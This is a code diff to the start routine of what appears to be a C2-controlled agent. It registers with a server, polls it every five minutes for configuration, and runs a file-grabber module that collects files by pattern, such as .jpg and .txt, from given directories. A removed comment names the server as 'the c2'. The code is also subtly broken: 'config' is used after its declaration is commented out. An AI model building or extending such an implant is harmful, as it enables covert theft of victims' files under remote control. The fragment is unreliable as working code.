@@ -2,28 +2,25 @@
 
 void Agent::start()
 {
-    #ifdef DEBUG
-    std::string json_string = R"(
-    {
-        "FILE_GRABGER": 
-        {
-            "1337": 
-            {
-            "start_path": "/tmp/aa",
-            "files": [".*.jpg", ".*\\.txt$"]
-            },
-            "1338": 
-            {
-                "start_path": "/tmp/gg",
-                "files": [".*abcd"]
-            }
-        }
-    }
-    )";
+    // std::string json_string = R"(
+    // {
+    //     "FILE_GRABGER": 
+    //     {
+    //         "1337": 
+    //         {
+    //         "start_path": "/tmp/aa",
+    //         "files": [".*.jpg", ".*\\.txt$"]
+    //         },
+    //         "1338": 
+    //         {
+    //             "start_path": "/tmp/gg",
+    //             "files": [".*abcd"]
+    //         }
+    //     }
+    // }
+    // )";
     
-    json config = json::parse(json_string);
-
-    #elif
+    // json config = json::parse(json_string);
 
     unsigned tries = 0;
     while (!agent_register())
@@ -37,18 +34,14 @@ void Agent::start()
         sleep(5);
     }
     
-    config = get_server_config();
-
-    #endif
-
-    start_from_config(config);
-
     while (agent_run)
     {
-        /* In reality we send http request to the c2, requesting new commands in this for loop */
-        sleep(60 * 60);
+        if(get_server_config())
+        {
+            start_from_config(config);
+        }
+        sleep(60 * 5);
     }
-    
 }
 
 
